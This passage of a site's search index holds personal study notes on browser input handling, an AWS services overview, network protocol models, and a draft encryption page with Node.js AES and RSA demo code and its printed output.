the same objects that the JS currently running is touching, so it must be done carefully. That said, the Firefox GC actually does do some work on a separate thread: some types of objects can be thrown away once they are known to be garbage without affecting the main thread.” Rasterizer Thread: rasterize your graphic into frames Etc. Appendix # Input events # The browser process is only aware of where that gesture occurred since content inside of a tab is handled by the renderer process. So the browser process sends the event type (like touchstart) and its coordinates to the renderer process\nRenderer process handles the event appropriately by finding the event target and running event listeners that are attached\nInput event routed through the browser process to the renderer process\nIf no input event listeners are attached to the page, Compositor thread can create a new composite frame completely independent of the main thread. But what if some event listeners were attached to the page? How would the compositor thread find out if the event needs to be handled?\n“Non-fast scrollable region” # Since running JavaScript is the main thread\u0026rsquo;s job, when a page is composited, the compositor thread marks a region of the page that has event handlers attached as \u0026ldquo;Non-Fast Scrollable Region\u0026rdquo;\nBy having this information, the compositor thread can make sure to send input event to the main thread if the event occurs in that region. If input event comes from outside of this region, then the compositor thread carries on compositing new frame without waiting for the main thread\nReference # Chrome: Inside look at modern web browser (part 1) (2018 Sep 21) Chrome: Inside look at modern web browser (part 2) (2018 Sep 21) Chrome: Inside look at modern web browser (part 3) (2020 Aug 18) Chrome: Inside look at modern web browser (part 4) (2019 Jan 12) Gitconnected: How web browsers use processes and threads (2020 Jul 17) Medium: Javascript main thread dissected (2017 Nov 13) V8: JavaScript modules (2018 Jun 18) "},{"id":10,"href":"/docs/research/aws_overview/","title":"AWS Overview","section":"RESEARCH","content":" AWS Overview # Slide # Types of Cloud Computing # EC2 - Elastic Compute Cloud # EC2 = Infrastructure as a Service (IaaS) On-Demand Instances – short workload, predictable pricing, pay by second Has the highest cost Recommended for short-term and un-interrupted workloads, where you can\u0026rsquo;t predict how the application will behave Reserved (1 \u0026amp; 3 years) Reserved Instances – long workloads Recommended for steady-state usage applications (think database) Convertible Reserved Instances – long workloads with flexible instances Savings Plans (1 \u0026amp; 3 years) – commitment to an amount of usage, long workload Spot Instances – short workloads, cheap, can lose instances (less reliable) The MOST cost-efficient Dedicated Hosts – book an entire physical server, control instance placement The most expensive option Dedicated Instances – no other customers will share your hardware No control over instance placement Capacity Reservations – reserve capacity in a specific AZ for any duration AMI - Amazon Machine Image # AMI are a customization of an EC2 instance AMI are built for a specific region (and can be copied across regions) You can launch EC2 instances from: A Public AMI: AWS provided Your own AMI: you make and maintain them yourself An AWS Marketplace AMI: an AMI someone else made (and potentially sells) EC2 Image Builder # Used to automate the creation of Virtual Machines or container images\n=\u0026gt; Automate the creation, maintain, validate and test EC2 AMIs Can be run on a schedule (weekly, whenever packages are updated, etc…) Free service (only pay for the underlying resources) EBS - Elastic Block Store # A network drive you can attach to your instances while they run It allows your instances to persist data, even after their termination They can only be mounted to one instance at a time They are bound to a specific AZ Think of them as a “network USB stick”\nSnapshots # Make a backup (snapshot) of your EBS volume at a point in time Can copy snapshots across AZ or Region Snapshots Features # Snapshot Archive Move a Snapshot to an ”archive tier” that is 75% cheaper Takes within 24 to 72 hours for restoring the archive Recycle Bin for EBS Snapshots Setup rules to retain deleted snapshots so you can recover them after an accidental deletion Specify retention (from 1 day to 1 year) EC2 Instance Store # If you need a high-performance hardware disk, use EC2 Instance Store Better I/O performance EC2 Instance Store lose their storage if they’re stopped (ephemeral) Good for buffer / cache / scratch data / temporary content Risk of data loss if hardware fails Backups and Replication are your responsibility EFS - Elastic File System # Managed NFS (network file system) that can be mounted on 100s of EC2 EFS works with Linux EC2 instances in multi-AZ Highly available, scalable, expensive (3x gp2), pay per use, no capacity planning EFS IA - EFS Infrequent Access # Storage class that is cost-optimized for files not accessed every day EFS will automatically move your files to EFS-IA based on the last time they were accessed Enable EFS-IA with a Lifecycle Policy FSx # for Windows File Server # A fully managed, highly reliable, and scalable Windows native shared file system Built on Windows File Server Supports SMB protocol \u0026amp; Windows NTFS Integrated with Microsoft Active Directory Can be accessed from AWS or your on-premise infrastructure for Lustre # A fully managed, high-performance, scalable file storage for High Performance Computing (HPC) The name Lustre is derived from “Linux” and “cluster” Machine Learning, Analytics, Video Processing, Financial Modeling, … S3 # \u0026ldquo;infinitely scaling\u0026rdquo; storage Buckets # Allows people to store objects (files) in buckets (directories) Buckets must have a globally unique name (across all regions all accounts) Buckets are defined at the region level Naming convention No uppercase, No underscore 3-63 characters long Not an IP Must start with lowercase letter or number Must NOT start with the prefix xn\u0026ndash; Must NOT end with the suffix -s3alias Objects # Objects (files) have a Key The key is the FULL path: s3://my-bucket/my_file.txt s3://my-bucket/my_folder1/another_folder/my_file.txt The key is composed of prefix + object name s3://my-bucket/my_folder1/another_folder/my_file.txt There’s no concept of “directories” within buckets\n(although the UI will trick you to think otherwise) Just keys with very long names that contain slashes (“/”) Object values are the content of the body: Max. Object Size is 5TB (5000GB) If uploading more than 5GB, must use “multi-part upload” Security # User-Based IAM Policies – which API calls should be allowed for a specific user from IAM Resource-Based Bucket Policies – bucket wide rules from the S3 console - allows cross account Object Access Control List (ACL) – finer grain (can be disabled) Bucket Access Control List (ACL) – less common (can be disabled) Static Website Hosting # S3 can host static websites and have them accessible on the Internet The website URL will be (depending on the region) http :// bucket-name .s3-website-aws-region.amazonaws.com\nOR http :// bucket-name .s3-website.aws-region.amazonaws.com If you get a 403 Forbidden error, make sure the bucket policy allows public reads! Versioning # It is enabled at the bucket level It is best practice to version your buckets Protect against unintended deletes (ability to restore a version) Easy roll back to previous version Notes: Any file that is not versioned prior to enabling versioning will have version “null” Suspending versioning does not delete the previous versions Replication # Must enable Versioning in source and destination buckets Cross-Region Replication (CRR) Same-Region Replication (SRR) Buckets can be in different AWS accounts Copying is asynchronous Must give proper IAM permissions to S3 Use cases: CRR – compliance, lower latency access, replication across accounts SRR – log aggregation, live replication between production and test accounts Storage Classes # Amazon S3 Standard - General Purpose Used for frequently accessed data Use Cases: Big Data analytics, mobile \u0026amp; gaming applications, content distribution Amazon S3 Standard-Infrequent Access (IA) For data that is less frequently accessed, but requires rapid access when needed Use cases: Disaster Recovery, backups Amazon S3 One Zone-Infrequent Access For data that is less frequently accessed, but requires rapid access when needed In a single AZ; data lost when AZ is destroyed Use Cases: Storing secondary backup copies of on-premise data, or data you can recreate Amazon S3 Glacier Instant Retrieval For data accessed once a quarter Millisecond retrieval Amazon S3 Glacier Flexible Retrieval (formerly Amazon S3 Glacier) Retrieval: Expedited (1 to 5 minutes), Standard (3 to 5 hours), Bulk (5 to 12 hours) – free Amazon S3 Glacier Deep Archive For long term storage Retrieval: Standard (12 hours), Bulk (48 hours) Amazon S3 Intelligent Tiering\nMoves objects automatically between Access Tiers based on usage Frequent Access tier (automatic): default tier Infrequent Access tier (automatic): objects not accessed for 30 days Archive Instant Access tier (automatic): objects not accessed for 90 days Archive Access tier (optional): configurable from 90 days to 700+ days Deep Archive Access tier (optional): config. from 180 days to 700+ days Encryption # IAM Access Analyzer # Ensures that only intended people have access to your S3 buckets Example: publicly accessible bucket, bucket shared with other AWS account… Evaluates S3 Bucket Policies, S3 ACLs, S3 Access Point Policies Powered by IAM Access Analyzer Snow Family # Highly-secure, portable devices to collect and process data at the edge, and migrate data into and out of AWS Data migration: Snowcone, Snowball Edge, Snowmobile Edge computing: Snowcone, Snowball Edge OpsHub # A software you install on your computer / laptop To manage your Snow Family Device Transferring files Launch compatible AWS services on your devices (ex: Amazon EC2 instances, AWS DataSync, Network File System (NFS)) Storage Gateway # Bridge between on-premise data and cloud data in S3 Hybrid storage service to allow on-premises to seamlessly use the AWS Cloud Use cases: disaster recovery, backup \u0026amp; restore, tiered storage Monitoring # CloudWatch: Metrics: monitor the performance of AWS services and billing metrics Alarms: automate notification, perform EC2 action, notify to SNS based on metric Logs: collect log files from EC2 instances, servers, Lambda functions… Events (or EventBridge): react to events in AWS, or trigger a rule on a schedule CloudTrail: audit API calls made within your AWS account CloudTrail Insights: automated analysis of your CloudTrail Events X-Ray: trace requests made through your distributed applications AWS Health Dashboard: status of all AWS services across all regions AWS Account Health Dashboard: AWS events that impact your infrastructure Amazon CodeGuru: automated code reviews and application performance recommendations ECS - Elastic Container Service # You must provision \u0026amp; maintain the infrastructure (the EC2 instances) Fargate # You do not provision the infrastructure (no EC2 instances to manage) – simpler! Serverless offering ECR - Elastic Container Registry # Store your Docker images Lambda # Virtual functions – no servers to manage! Limited by time - short executions Run on-demand Scaling is automated! Event-Driven: functions get invoked by AWS when needed Pricing # Pay per calls Pay per duration Example # Serverless Thumbnail creation\nServerless CRON Job\nAPI Gateway # Serverless and scalable Supports RESTful APIs and WebSocket APIs Support for security, user authentication, API throttling, API keys, monitoring\u0026hellip; Batch # Fully managed batch processing at any scale Batch will dynamically launch EC2 instances or Spot Instances Batch jobs are defined as Docker images and run on ECS Batch vs Lambda # Lambda\nTime limit Limited runtimes Limited temporary disk space Serverless Batch\nNo time limit Any runtime as long as it’s packaged as a Docker image Rely on EBS / instance store for disk space Relies on EC2 (can be managed by AWS) Lightsail # Simpler alternative to using EC2, RDS, ELB, EBS, Route 53 Great for people with little cloud experience! \u0026ldquo;almost always be a wrong answer\u0026rdquo; CloudFormation # Infrastructure as code\nWithin a CloudFormation template, you say:\nI want a security group I want two EC2 instances using this security group I want an S3 bucket I want a load balancer (ELB) in front of these machines Then CloudFormation creates those for you, in the right order, with the exact configuration that you specify\nCDK - Cloud Development Kit # Define your cloud infrastructure using a familiar language: JavaScript, Python, \u0026hellip; You can use for loop to create multiple instances The code is “compiled” into a CloudFormation template (JSON/YAML) You can therefore deploy infrastructure and application runtime code together Elastic Beanstalk # Overview # A developer centric view of deploying an application on AWS It uses all the component’s we’ve seen before: EC2, ASG, ELB, RDS, etc Beanstalk = Platform as a Service (PaaS) Beanstalk is free but you pay for the underlying instances Just the application code is the responsibility of the developer Three architecture models: Single Instance deployment: good for dev LB + ASG: great for production or pre-production web applications ASG only: great for non-web apps in production (workers, etc..) Health Monitoring # Health agent pushes metrics to CloudWatch Checks for app health, publishes health events CodeDeploy # We want to deploy our application automatically Works with EC2 Instances Works with On-Premises Servers Hybrid service Servers / Instances must be provisioned and configured ahead of time with the CodeDeploy Agent CodeCommit # Like GitHub Developers usually store code in a repository, using the Git technology CodeBuild # Compiles source code, run tests, and produces packages that are ready to be deployed (by CodeDeploy for example) Pay-as-you-go pricing - only pay for the build time CodePipeline # Orchestrate the different steps to have the code automatically pushed to production Code =\u0026gt; Build =\u0026gt; Test =\u0026gt; Provision =\u0026gt; Deploy Basis for CICD (Continuous Integration \u0026amp; Continuous Delivery) CodeArtifact # Software packages depend on each other to be built (also called code dependencies), and new ones are created Storing and retrieving these dependencies is called artifact management Developers and CodeBuild can then retrieve dependencies straight from CodeArtifact CodeStar # Unified UI Set-up CodeCommit, CodePipeline, CodeBuild, CodeDeploy, Elastic Beanstalk, EC2, etc Cloud9 # A cloud IDE Allows for code collaboration in real-time (pair programming) SSM - Systems Manager # Manage your EC2 and On-Premises Hybrid AWS service Session Manager # Allows you to start a secure shell on your EC2 and on-premises servers No SSH access, bastion hosts, or SSH keys needed No port 22 needed (better security) Supports Linux, macOS, and Windows Send session log data to S3 or CloudWatch Logs Parameter Store # Secure storage for configuration and secrets API Keys, passwords, configurations… Serverless, scalable, durable, easy SDK Control access permissions using IAM Version tracking \u0026amp; encryption (optional) OpsWorks # AWS OpsWorks = Managed Chef \u0026amp; Puppet Chef \u0026amp; Puppet (2 tools not created by AWS) help you perform server configuration automatically, or repetitive actions Route 53 - DNS # Route53 is a Managed DNS (Domain Name System) DNS is a collection of rules and records which helps clients understand how to reach a server through URLs Routing Policies # CloudFront - CDN # Content Delivery Network (CDN) Improves read performance, content is cached at the edge DDoS protection (because worldwide), integration with Shield, AWS Web Application Firewall S3 bucket Enhanced security with CloudFront Origin Access Control (OAC) OAC is replacing Origin Access Identity (OAI) CloudFront can be used as an ingress (to upload files to S3) CloudFront vs S3 Cross Region Replication # CloudFront: # Global Edge network Files are cached for a TTL (maybe a day) Great for static content that must be available everywhere S3 Cross Region Replication: # Must be setup for each region you want replication to happen Files are updated in near real-time Read only Great for dynamic content that needs to be available at low-latency in few regions S3 Transfer Acceleration # Increase transfer speed by transferring file to an AWS edge location which will forward the data to the S3 bucket in the target region Global Accelerator # Improve global application availability and performance using the AWS global network Leverage the AWS internal network to optimize the route to your application (60% improvement) 2 Anycast IP are created for your application and traffic is sent through Edge Locations The Edge locations send the traffic to your application AWS Global Accelerator vs CloudFront # They both use the AWS global network and its edge locations around the world Both services integrate with AWS Shield for DDoS protection CloudFront - CDN # Improves performance for your cacheable content (such as images and videos) Content is served at the edge Global Accelerator # No caching, proxying packets at the edge to applications running in one or more AWS Regions. Improves performance for a wide range of applications over TCP or UDP Good for HTTP use cases that require static IP addresses Good for HTTP use cases that required deterministic, fast regional failover Outposts # Hybrid Cloud: businesses that keep an on-premises infrastructure alongside a cloud infrastructure AWS Outposts are “server racks” that offers the same AWS infrastructure, services, APIs \u0026amp; tools to build your own applications on-premises just as in the cloud AWS will setup and manage “Outposts Racks” within your on-premises infrastructure and you can start leveraging AWS services on-premises You are responsible for the Outposts Rack physical security WaveLength # WaveLength Zones are infrastructure deployments embedded within the telecommunications providers\u0026rsquo; datacenters at the edge of the 5G networks Use cases: Smart Cities, ML-assisted diagnostics, Connected Vehicles, Interactive Live Video Streams, AR/VR, Real-time Gaming, … Local Zones # Places AWS compute, storage, database, and other selected AWS services closer to end users to run latency-sensitive applications Extend your VPC to more locations – “Extension of an AWS Region” Example: AWS Region: N. Virginia (us-east-1) AWS Local Zones: Boston, Chicago, Dallas, Houston, Miami, … Global Applications Architecture # "},{"id":11,"href":"/docs/research/be_protocol/","title":"Backend Protocol","section":"RESEARCH","content":" Backend Protocol # What is a protocol? # A system that allows two parties to communicate A protocol is designed with a set of properties Depending on the purpose of the protocol TCP, UDP, HTTP, gRPC, FTP The application protocols (HTTP/1.1, HTTP/2, HTTP/3) run on top of transport protocols (TCP, UDP) Protocol properties # Data format Text based (plain text, JSON, XML) Binary (protobuf, RESP, h2, h3) Transfer mode Message based (UDP, HTTP) Stream (TCP, WebRTC) Addressing system DNS name, IP, MAC Directionality Bidirectional (TCP) Unidirectional (HTTP) Full/Half duplex State Stateful (TCP, gRPC, apache thrift) Stateless (UDP, HTTP) Routing Proxies, Gateways Flow \u0026amp; Congestion control TCP (Flow \u0026amp; Congestion) UDP (No control) Error management Error code Retries and timeouts Why do we need a communication model? # Agnostic applications App doesn’t need to to know network medium Otherwise we need an App for WIFI, ethernet vs LTE vs fiber Network Equipment Management Without a standard model, upgrading network equipments becomes difficult Decoupled Innovation Innovations can be done in each layer separately without affecting the rest of the models OSI Model # 7 Layers each describe a specific networking component:\nLayer 7: Application - HTTP/FTP/gRPC Layer 6: Presentation - Encoding, Serialization Layer 5: Session - Connection establishment, TLS Layer 4: Transport - UDP/TCP Layer 3: Network - IP Layer 2: Data link - Frames, Mac address Ethernet Layer 1: Physical - Electric signals, fiber or radio waves Data across network # TCP/IP Model # Much simpler than OSI just 4 layers\nWhy # OSI Model has too many layers which can be hard to comprehend Hard to argue about which layer does what Simpler to deal with Layers 5-6-7 as just one layer, application TCP/IP Model does just that Reference # Geeksforgeeks: TCP/IP Model (21 Jul, 2023) Udemy: Fundamentals of Backend Engineering (Feb, 2024) "},{"id":12,"href":"/docs/research/encryption/","title":"Encryption - Draft","section":"RESEARCH","content":" Encryption # Hash # Note: An 8-bit byte is represented as 2 characters, from 00 to FF, in hexadecimal\nCollision # Use case # Checking file integrity HMAC # HMAC stand for Hash-Based Message Authentication Codes Symmetric encryption # Uses the same key to encrypt and decrypt messages\nAES, Twofish and ChaCha20\nUse case # HTTPS with SSL/TLS: Session key Data Transmission Data Storage Demo code # This example demonstrates symmetric encryption and decryption in NodeJS using the crypto module with AES (Advanced Encryption Standard) in AES-256-CBC mode\nInit necessary functions NodeJS\nconst crypto = require(\u0026#39;crypto\u0026#39;); function generateKeyAndIv() { const key = crypto.randomBytes(32).toString(\u0026#39;hex\u0026#39;); // 256-bit key as hex string const iv = crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;); // 128-bit IV as hex string return { key, iv }; } function encrypt(text, keyHex, ivHex) { const key = Buffer.from(keyHex, \u0026#39;hex\u0026#39;); // Convert key from hex to Buffer const iv = Buffer.from(ivHex, \u0026#39;hex\u0026#39;); // Convert iv from hex to Buffer const cipher = crypto.createCipheriv(\u0026#39;aes-256-cbc\u0026#39;, key, iv); let encrypted = cipher.update(text, \u0026#39;utf8\u0026#39;, \u0026#39;hex\u0026#39;); encrypted += cipher.final(\u0026#39;hex\u0026#39;); return encrypted; } function decrypt(encryptedText, keyHex, ivHex) { const key = Buffer.from(keyHex, \u0026#39;hex\u0026#39;); // Convert key from hex to Buffer const iv = Buffer.from(ivHex, \u0026#39;hex\u0026#39;); // Convert iv from hex to Buffer const decipher = crypto.createDecipheriv(\u0026#39;aes-256-cbc\u0026#39;, key, iv); let decrypted = decipher.update(encryptedText, \u0026#39;hex\u0026#39;, \u0026#39;utf8\u0026#39;); decrypted += decipher.final(\u0026#39;utf8\u0026#39;); return decrypted; } Encrypt and decrypt a message NodeJS\nconst { key, iv } = generateKeyAndIv(); console.log(\u0026#34;Generated Key (hex):\u0026#34;, key); console.log(\u0026#34;Generated IV (hex):\u0026#34;, iv); const message = \u0026#34;Hello, this is a secret message!\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encrypt(message, key, iv); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decrypt(encryptedMessage, key, iv); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nGenerated Key (hex): 00298bfc28cf81a3de3502951b70f3568c4dd5dadbcfadd7b79fee2e640aee07 Generated IV (hex): 387591abb794b2345f496bb1192ace36 Original Message: Hello, this is a secret message! Encrypted Message: 96b91c46b8e380a3b3fc9caf473821508f1ec313ed8b4306eb839c9c04f3692ed0579485016559e272ba9c3c54c5c449 Decrypted Message: Hello, this is a secret message! Decrypt a message with wrong key NodeJS\nconst { key, iv } = generateKeyAndIv(); console.log(\u0026#34;Generated Key (hex):\u0026#34;, key); console.log(\u0026#34;Generated IV (hex):\u0026#34;, iv); const { key: key2 } = generateKeyAndIv(); console.log(\u0026#34;Generated Key 2 (hex):\u0026#34;, key2); const message = \u0026#34;Hello, this is a secret message!\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encrypt(message, key, iv); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decrypt(encryptedMessage, key2, iv); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nGenerated Key (hex): 0e35a011a116b0708012ae4165b95be678300be387478c1f217dbc48a1e5f2e8 Generated IV (hex): 6b714efdcab58ebc399332b79df8354d Generated Key 2 (hex): c5bd73c9fa521dd1b019b3be1010645fc2152db17401006781a3908db43ca94f Original Message: Hello, this is a secret message! Encrypted Message: a4b90407ab748d8002d2f33b6ae8698460ed11d1640592fb2e83da9f101e7795ba54e447162f5373f49592ebfff8fa5c node:internal/crypto/cipher:199 const ret = this[kHandle].final(); ^ Error: error:1C800064:Provider routines::bad decrypt at Decipheriv.final (node:internal/crypto/cipher:199:29) at decrypt (/home/dangpham/Workspace/nodejs/demo/symmetric.js:23:27) at Object.\u0026lt;anonymous\u0026gt; (/home/dangpham/Workspace/nodejs/demo/symmetric.js:55:26) at Module._compile (node:internal/modules/cjs/loader:1356:14) at Module._extensions..js (node:internal/modules/cjs/loader:1414:10) at Module.load (node:internal/modules/cjs/loader:1197:32) at Module._load (node:internal/modules/cjs/loader:1013:12) at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:128:12) at node:internal/main/run_main_module:28:49 { library: \u0026#39;Provider routines\u0026#39;, reason: \u0026#39;bad decrypt\u0026#39;, code: \u0026#39;ERR_OSSL_BAD_DECRYPT\u0026#39; } Node.js v18.19.1 Decrypt a message with wrong iv NodeJS\nconst { key, iv } = generateKeyAndIv(); const { iv: iv2 } = generateKeyAndIv(); const message = \u0026#34;Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encrypt(message, key, iv); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decrypt(encryptedMessage, key, iv2); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nGenerated Key (hex): 76e1a03f6b3e326cd8c383ce12ff6fbd4b77c484afa7811f93304bc548b9de01 Generated IV (hex): 11edd0224d639ac9d8b1c0a1297ed758 Generated IV2 (hex): aca3f6cd3738dab6c97c43a211ec121f Original Message: Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Encrypted Message: 3189b2b3fbb3d511086609f2cbb5f68928fd980bad454fbcfba3c7aada3f6499832a19be0b6285f3b6ed175d67b4fb04c76c4443873a7f6eecbbf3a667dfc70146916de1f55d5e6d057bbed520e9489b97ce25d1cae41a58db5fe3adcf59d6f0d668a4b9561f32303544b90aa5a800000fe2f30f611e9b23af7170e9f95abecd2023df028570e8816a02c603883a90b1b722f2139b3588e78f4dad472f1e799875e30e8a54f9ae9a761779963abd83cc9a8138a91f57b66a9c499a0e0ae0d57ee409bd381d15c52fdeee4b96684cc35bf2db78dedfa433db25fd1323c887597693571d9dab1c1b052a9ed74195aae89a6db5ef47bed08aae24100b19e7ca3e64389fa8b99ad89104f50a7aa291731985e0b464213df61e50df2df5b22b21767987e5b40c5def1ae6ce80a34845d13ca06a6fe250ef291a4ef01b01b531c843d0201b8b06d41b727e0799dd6742a5814a76fefc57a0ba1f7badc854702e8c6f2f88c13d320c45c300a007464c64e73919403e21527570dec2afbb21746fded82a4360887ff7aad565a797cc731deb6cf6f23dccb73427b21c061f46939d1d5e6ef7b16079467199a9ce03f558dbcb3141f2502683cb5af69ec47e35f343bb5e25 Decrypted Message: �!T�{)b��#\\��(r sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Asymmetric encryption # Uses a public-key cryptosystem (like RSA or ECC) and a key-pair: encryption key and corresponding decryption key\nEncryption algorithms are often combined in encryption schemes (like AES-256-CTR-HMAC-SHA-256, ChaCha20-Poly1305 or ECIES-secp256k1-AES-128-GCM)\nDemo of public key encryption and private key decryption # This example demonstrates asymmetric encryption using an RSA public key to encrypt and an RSA private key to decrypt a message in Node.js with the crypto module\nInit necessary functions NodeJS\nconst crypto = require(\u0026#39;crypto\u0026#39;); const generateKeyPair = () =\u0026gt; { return crypto.generateKeyPairSync(\u0026#39;rsa\u0026#39;, { modulusLength: 2048, // Length of key in bits (2048 is standard) publicKeyEncoding: { type: \u0026#39;pkcs1\u0026#39;, // Public Key Cryptography Standards 1 format: \u0026#39;pem\u0026#39; // Output as PEM (Base64 encoded) }, privateKeyEncoding: { type: \u0026#39;pkcs1\u0026#39;, // Private Key Cryptography Standards 1 format: \u0026#39;pem\u0026#39; // Output as PEM (Base64 encoded) } }); } function encryptWithPublicKey(publicKeyPem, message) { const encrypted = crypto.publicEncrypt(publicKeyPem, Buffer.from(message)); return encrypted.toString(\u0026#39;base64\u0026#39;); // Convert encrypted message to base64 for readability } function decryptWithPrivateKey(privateKeyPem, encryptedMessage) { const decrypted = crypto.privateDecrypt(privateKeyPem, Buffer.from(encryptedMessage, \u0026#39;base64\u0026#39;)); return decrypted.toString(\u0026#39;utf8\u0026#39;); // Convert decrypted message to utf8 string } Public key to encrypt and private key to decrypt a message NodeJS\nconst { publicKey, privateKey } = generateKeyPair(); console.log(\u0026#34;Public Key (PEM format):\\n\u0026#34;, publicKey); console.log(\u0026#34;Private Key (PEM format):\\n\u0026#34;, privateKey); const message = \u0026#34;Hello, this is a secret message!\u0026#34;; console.log(\u0026#34;Original Message:\u0026#34;, message); const encryptedMessage = encryptWithPublicKey(publicKey, message); console.log(\u0026#34;Encrypted Message:\u0026#34;, encryptedMessage); const decryptedMessage = decryptWithPrivateKey(privateKey, encryptedMessage); console.log(\u0026#34;Decrypted Message:\u0026#34;, decryptedMessage); Output\nPublic Key (PEM format): -----BEGIN RSA PUBLIC KEY----- MIIBCgKCAQEA0ivCBvmxFewdtUePX8RG3+SKifuEz9dsoSEJzQiCbdOfxCzZiyCb R7azQhY67IKC93qr/j7zyCGx3WJ2lrRd4ij51Q9CIn75zPExEfLMvCt0HQtO+UQo w0QZLGIZc6Q+eJfQg++PeUVYpZPT/jp3RXHEScpZJfHCarhl6JfCkuu3YuITSpta rhUuaw6UMoWnZCbr0/OW2rC3s97p+VIr5i3jCf+z84E7dTZ529mZ1PsxNue5NKqO /SWyjrNvwORMkdYweoSqz5oZ0U2B29mUWRkhcOrPmrRBCxMRwWTmQC3PpzrAwG2/ eQfbKX1tzzSVjjjMUgKvmeLvr57au62yLwIDAQAB -----END RSA PUBLIC KEY----- Private Key (PEM format): -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEA0ivCBvmxFewdtUePX8RG3+SKifuEz9dsoSEJzQiCbdOfxCzZ iyCbR7azQhY67IKC93qr/j7zyCGx3WJ2lrRd4ij51Q9CIn75zPExEfLMvCt0HQtO +UQow0QZLGIZc6Q+eJfQg++PeUVYpZPT/jp3RXHEScpZJfHCarhl6JfCkuu3YuIT SptarhUuaw6UMoWnZCbr0/OW2rC3s97p+VIr5i3jCf+z84E7dTZ529mZ1PsxNue5 NKqO/SWyjrNvwORMkdYweoSqz5oZ0U2B29mUWRkhcOrPmrRBCxMRwWTmQC3PpzrA wG2/eQfbKX1tzzSVjjjMUgKvmeLvr57au62yLwIDAQABAoIBAELNKr4p1gn4QxcP +DfBvJ9EVm52Fegz+jCavjE/r6k11vW1Ja4tfn2ESiTKyQ7MitEbWhiVLMojP5P0 zGmpSZ/tUz9Pur8ZKc/kp6qjSETU8PKcWg0rh2NNPU0Ynytc/Ig7BMkytyEeFAeI 3ZxUO/3EI9YqbTx8w8VE+As+VVd55dkkoEShi77ibxFNeevWvS46k/d1a5hcsVj8 NlsngHux8ZwUu8ZaIQH0wclLo77TcDOJF9NkJb7x8xzXH/pvNOPu49nA098zob6c ivZTW6z2Jsa94NzPzvCQ/NLumrkt07bE0HBXJCkaajlhjn69gXR2fEfWVrryW3e9 sLFEPJUCgYEA9hz4qFpM/QB4q1AzNR7ZK5vfzfAIAQWPmbVpFZXYdUD+tzXut7Yu dd4WZU1l/LgUeLUmUfJqDwiMOz/pGSTNcJqtHl3wP2Yz9n1fcWhxdbjbPZkB1+Di dhKkxvxEih4PyK+367udHcJYF+Su7Pl2hNmBMvTc0rzWpdJHRVCrwEMCgYEA2p0o Dyy5dBhrMCi083074qQhdXQqX1+f0KDZXy1u8JtooktbpARfyc+P9/hT+sdvxln7 hEsYPkplvPS3ahm0tb4tCW1esAZLhn8RvYJqJConBawKRw2oVJ9YCW1Et4vn+oKU pLfvmgX/PgCIuVn6szmU4LUj9pHoaoE5E0ulLaUCgYEA5n+dtvbTsgR1/2RegTrC BGC5TAOpS2Os6TWJFKlBkBduN6KwT6i1fLiiWwARK44vxhlKqWcTQ78qrvcdVeos 6nBDAPTT5FzQ/+LNt8YstSeLVfZuToQVNKYjYyWy/3RGLhu8cnBFJzD0FnScC99b y/J1WYcRJeGsWqNFErsKEEcCgYAw/e0/UVeSU/KZjVXYB2XHSd8RsmHYk9Z9674r HURyeXF+hYLZA/3vfSuXd7hiSBWdjwbVw/p/4y5fpTwBdBdSb3cqWK9SpWaBkrKI FNTym9u44rA+8imaJUeWfT1cIOdw9ZiYPXxduSBVZcs+NpL/XVUm8pFHrbU3QRRo ZZhz3QKBgHcVAZq3TaigmrupfdGlSDN+NdxP7EhOlGaYu5LuJcfic2q/W1+SKoQK 5osEUzV/SeWQH5oHW/2ASx2GOwyiWcn2RfXRFPSXfX4aHfO3JBOZVJ8Wzql9WhST NEw2BFi05XXkbE/ncxq5+SZsHVGQVZ0hlkG2oPc3Hp7sDAMJSDQC -----END RSA PRIVATE KEY----- Original Message: Hello, this is a secret message! Encrypted Message: Vb+Oc8Kn76rvjJuXZOvtLGsQDm/VGXzB2KbqzWXr5UMZV4bXLkhCs407H4Li4ImROH6uPXlA+SNPSYr0XpLQ+Uksnt2b8YbUQZUSvi15bJbXKKXsvo9FLg2ygcSUiqBjGs3coMbWh0sZnGN+GpXbIld8ItGCkLRnMDkvCK/uzgA11bmLcBOFt726ytjK0qGJGDM1svL2A2ZTXGgnLMUSnSzNxWv5K4sUU0yi38/ineL1Kc6FLlUo3YrLnW6MvB0rp+lF9VRGw8Sbagpm01PcnQiQH28OmbQxLomScQ4Mq1EXqN7oVgE2kMDXIO0mec6I0TmLtsLjWirN0iT2Um/cDQ== Decrypted Message: Hello, this is a secret message! Private key to encrypt and decrypt a message NodeJS\nconst { privateKey } = generateKeyPair(); console.log(\u0026#34;Private Key 